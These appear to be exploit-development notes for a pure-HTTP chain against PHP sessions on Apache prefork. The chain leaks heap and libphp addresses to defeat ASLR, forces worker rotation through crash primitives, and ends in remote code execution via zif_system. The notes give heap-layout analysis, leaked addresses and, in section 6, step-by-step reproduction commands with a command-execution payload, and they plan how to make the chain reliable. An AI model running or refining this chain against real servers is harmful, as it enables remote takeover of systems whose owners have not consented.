# Pure HTTP ASLR chain: research notes on the rotation problem

Date: 2026-10-21
Reference implementation: [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (someone else has already achieved 5/5, using
SIGSEGV to rotate the worker between stages)
Constraints: attack requests use HTTP only; **no instrumentation is performed on the target 172.16.0.103**
(no gdb, no /proc reads, no target-side PHP). All gdb measurements in this document were performed on
**our own calibration lab 172.16.1.112** and did not touch the target process.

Status: **the address leaks and the RCE execution endpoint are already pure HTTP; the only remaining engineering
item is "how to rotate the worker between stages with a single HTTP request"**. This has not yet been
made to work; this document records the blocker and the next steps.

---

## 1. Verified (all on 172.16.0.103, HTTP only)

### 1.1 Stage 2 leak on a fresh master

```text
$ sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start
$ python3 send_a_leak3.py 1001 5 39 12 17
$ python3 b_target.py 443 16 983

Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%E1%01%A6%7F%00%00; path=/
pDestructor = 0x7fa601e13c50
libphp      = 0x7fa601800000   (pDestructor - 0x613c50)
```

`(p & 0x1fffff) == 0x13c50`, libphp is 2MB-aligned, and the leak is valid.

### 1.2 Stage 1 + stage 2 can be completed on the **same worker**

```text
W0=882266
after A1 W=882266
after B1 W=882266
after A2 W=882266
after B2 W=882266
```

That is:

1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base;
2. On the same worker, `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983`
   → libphp base (still returns 16 bytes of `pDestructor`).

This shows that the claim "every stage must use a fresh worker" does not hold; **the two leaks can be
merged into a single worker history**, and only one rotation is needed before stage 3.

### 1.3 HTTP crash rotation works on a **brand-new worker**

```text
FRESH W=881054
after A W=881054
CRASHED new=881148 at 17
final W=881148
```

This uses `rotate()` from the script:

```text
send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
send_b_rce2.py 15 2 0x1 0x1 x
```

`send_b_rce2`'s fake reference lands at the fresh worker's `R0-0x10`, with `val.value=1`;
`zend_array_destroy(1)` → SIGSEGV, and prefork immediately forks a new worker.

---

## 2. Failure point: HTTP rotate does not work on a **worker that has served leak requests**

### 2.1 Result of removing signals from the official driver and using only HTTP rotate

On .103, change the sudo in `pure_aslr_run.sh` to `sudo -n` and leave everything else unchanged:

```text
W1=877061 chunk=0x7f6beba00000 attempt=1
W2=877299 libphp=0x0 attempt=1
W2=877349 libphp=0x0 attempt=2
LIBPHP_LEAK_FAILED
```

Stage 1 succeeds; after the HTTP rotate, stage 2 fails twice in a row to obtain the libphp leak
(`b_target.py` does not return a 16-byte `Set-Cookie`).

### 2.2 Direct observation of rotate

After stage 1, 6 consecutive `send_a_pad + send_b_rce2(HT=1)` runs leave the worker pid
**unchanged every time**:

```text
PHASE1 W=879429
no-rotate try=1 W=879429
...
no-rotate try=6 W=879429
STAGE2 W=879429
SETCOOKIE_LEN 72
VALUE Set-Cookie: PHPSESSID=%10...P%3CaP%EA%7F...
```

In this run stage 2 instead succeeds on the same worker, which shows:

- rotate's crash request does not trigger after earlier requests have changed the worker's state;
- stage 2 does not depend on a fresh worker (consistent with 1.2).

---

## 3. Root cause (gdb measurements on the .112 calibration lab)

> The addresses below are chunk-relative values from the no-ASLR lab; the target uses ASLR, but the
> intra-chunk geometry is the same. The measurements do not involve 172.16.0.103.

### 3.1 Geometry of fresh stage 3

- A `send_a_pad 17 19 3 12 6×7:7`:
  `PS(http_session_vars).value.ref = chunk + 0x24e0`.
- `R0 - 0x10 = chunk + 0x24d0`, exactly the start of the free block in the 56B bin.
- The 55B fake-ref raw from B `send_b_zif 15 2 ...` lands exactly here;
  the fake reference's fields are at raw+0x10, aligned with `R0`.

### 3.2 The layout after earlier requests is completely different

First perform stage 1 + stage 2 on the same worker, then send stage 3 A:

| pads P | R0 | Page containing R0 | That page's map at B `track_init` |
|---|---|---|---|
| 6 | chunk+0x1560 | page 1 | `0x80000003` = 32B bin |
| 7 | chunk+0x15c0 | page 1 | `0x80000003` = 32B bin |
| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/large-block continuation page |
| 640 | chunk+0x8b320 | page 139 | `0x0` = FRUN free page |

By contrast, the page containing fresh `R0=chunk+0x24e0` is a 56B bin (the 56B free head is
`chunk+0x24d0`).

Conclusion:

1. **Under used history, `R0` falls on a 32B bin page**, not a 56B page;
2. `send_b_zif`'s fake-ref raw is 55B → 56B bin, so it **cannot be allocated into a 32B page**;
3. Even if P moves `R0` to a page-aligned 56B slot (for example, `R0-0x10=chunk+0x15b0` at P=7),
   that page is still a 32B bin at B time (`map=0x80000003`), and the 56B raw buffer still cannot be allocated there;
4. At P=640 the `R0` page is even FRUN (the whole page is free), yet the current head of the 56B bin is still
   `chunk+0x24d0`; the allocator will not take that high-address free page for a few dozen 56B allocations.

### 3.3 Under used history, B may never reach track_init

With a breakpoint at `session.c:481` (the `php_session_track_init()` call site) on a new (fresh) worker,
A+B hit it and see the reference. With used history (after stage 1+2, A P=6), setting the same breakpoint
and sending B (`b_crash7.py 14`) produces **not a single hit**;
`php_session_rfc1867_cleanup` / `php_session_initialize` are not hit either.

This indicates two possibilities under used history (depending on P/timing):

- A aborts on its own during request shutdown, and B is handled by a newly forked worker from the parent;
  the new worker has no dangling reference, and `track_init` will not destroy the old one;
- or B's END cleanup returns early inside `php_session_initialize()` and never reaches `track_init`.

Either way, **the fake-reference trigger point of fresh stage 3 does not hold under used history**.
This is also why the same-worker scan at P=50..75 is all `nop`.

---

## 4. What the pure HTTP path requires

To fill the last piece **without touching the target**, there are only two paths:

### 4.1 Reliable HTTP worker rotation (recommended)

Split "leak" and "exploit" across two fresh workers:

```text
W1 (fresh): stage 1 + stage 2 leak (verified they can share a worker)
HTTP crash W1 -> W2 (fresh, prefork inherits the same master's ASLR)
W2 (fresh): stage 3 exploit (existing fresh parameters, verified)
```

All that is missing is "W1 is used; how do we make it crash over HTTP". The existing `rotate()`'s
`send_a_pad + send_b_rce2(HT=1)` works only on a fresh worker.

Pure HTTP crash primitives to try:

1. **`b_crash7` (32B live string)**
   - overwrite the used `R0` with N 7-byte values (zend_string 32B);
   - `R0` is a 32B slot, exactly matching a 32B value string;
   - `PS(http_session_vars)` is still treated as a reference: `h=0` is read as
     `val.value`, `len=7` is read as `IS_ARRAY` → `zend_array_destroy(NULL)`
     crashes, **with no 56B page re-split needed and no effect from free-list shadowing**.
   - Blocker: B must actually reach `track_init`, and the old reference must still be present (under used
     history it is sometimes UNDEF, or B is handled by a new worker). N must be calibrated for used history,
     and A must first be confirmed not to crash.
2. **Make A itself abort deterministically at shutdown**
   - Under used history A sometimes aborts (`W3=0` at P=50/68), but it is not controllable;
   - we need to find an A shape such that the stale 32B block of `PS(http_session_vars)` inevitably triggers
     `zend_mm_panic` after the heap reset, while A's response has already been sent.
3. **Find a deterministic crash in malformed multipart / at the Apache layer**
   - independent of PHP heap layout and pure HTTP; not found yet.

### 4.2 Skip rotation and calibrate used-history stage 3 directly

The following must be solved at the same time:

1. The page containing `R0` must be a 56B bin (or a fake-ref layout matching 32B must be used instead);
2. The 56B fake raw must land in the specific free slot `R0-0x10`;
3. A must not crash, and B must reach `track_init`;
4. The fake HT carrier address of `send_b_zif` (fresh is `chunk+0x6e0d8`)
   must also be recalibrated under used history.

Items 1 and 3 already have counterexamples (the page is 32B, B does not hit), so this path costs more.

---

## 5. Recommended next experiments

Prioritize 4.1.1 (crash7), because it needs only **32B geometry**, which naturally matches used `R0`:

1. On .112, fix the used history (stage 1+2 on the same worker), use P=6 for A,
   and use a `session.c:481` breakpoint to confirm whether `PS(http_session_vars)` is still a
   reference after A (and the id/send_cookie state);
2. If the reference still exists after A, scan the N in `b_crash7.py N`, and use the breakpoint to inspect the
   qwords at `R0`:
   - `q0 = 0x0000000600000001` (live string, rc=1/type=6)
   - `q2 = 7` (len=7)
   - `q3 = 0x0076767676767676` ('v'*7)
   i.e. a hit;
3. After a hit, send `b_crash7.py N` directly (without gdb) and confirm the worker pid changes;
4. On .103, use HTTP only:
   - fresh W1: stage 1 + stage 2 leaks;
   - rotate with `send_a_pad P=6 + b_crash7 N`;
   - fresh W2: stage 3 `send_a_pad 6 pads + send_b_zif 15 2 HTDATA ZIF`,
     with addresses from W1 (prefork inherits the same master's ASLR, and the chunk/libphp base
     stays unchanged after the worker is re-forked; see Section 5 of ASLR_PURE_HTTP.md).
5. If crash7's old reference does not exist under used history, fall back to
   making stage 2's B abort on its own after the leak (change `b_target`'s target array layout
   so that the gc/refcount path of `zend_string_release_ex(PS(id))` calls `efree` on an invalid internal
   pointer); then W1 rotates naturally after stage 2, and W2 runs fresh stage 3 directly.

---

## 6. Reproduction commands (.103, pure HTTP; no gdb/maps)

```bash
# 1) fresh master
sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start; sleep 0.5

# 2) W1: chunk leak + libphp leak on the same worker
python3 send_a_leak2.py 1001 12; sleep 0.2
python3 b_numleak2.py 892 1 0x1000; sleep 0.2
python3 send_a_leak3.py 1001 5 39 12 17; sleep 0.2
python3 b_target.py 443 16 983
# parse /tmp/b_numleak2.resp -> chunk, /tmp/b_target.resp -> pDestructor

# 3) pure HTTP rotation (N to be calibrated)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 b_crash7.py <N>

# 4) W2: fresh stage 3
HT=$(chunk+0x6e0d8); ZIF=$(libphp+0x43a870)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 send_b_zif.py 15 2 $HT $ZIF 'id>/tmp/p1'
```

---

## 7. Files

| File | Purpose |
|---|---|
| `tools/b_crash7.py` | 32B live-string crash primitive (N to be calibrated) |
| `tools/refq2.gdb` / `flow.gdb` | Used on .112 to inspect the reference/track_init flow of used history |
| `tools/pagemap.gdb` | Reads the `chunk->map` / free_slot of the R0 page on .112 |
| `tools/send_b_probe.py` / `b_probe_long.py` | Fake-ref landing-site probes |
| `tools/same_worker_trials.py` | Same-worker stage 3 P scan (.112) |
| `tools/pure_aslr_run.sh` | Someone else's driver (includes HTTP rotate, unstable on workers that have already served requests) |

---

## 8. Conclusion

- **The attack requests, both address leaks, and the `zif_system` execution endpoint are already pure HTTP**;
- In the recorded 5/5, inter-stage rotation used SIGSEGV; the script's HTTP `rotate()`
  is reliable only on a fresh worker and does not trigger on a worker that has served leaks;
- The root cause under used history is that `R0` lands on a 32B bin page, while the fake-ref raw buffer for
  fresh stage 3 belongs to the 56B bin; the page is not re-split, so the landing-site geometry does not hold;
- The shortest path to close the gap is: **stage 1+2 on the same worker → use `b_crash7` (32B) for a
  pure HTTP crash → run the existing stage 3 on fresh W2**. crash7's N must be
  calibrated for used history, and the old reference must first be confirmed to still exist after A.
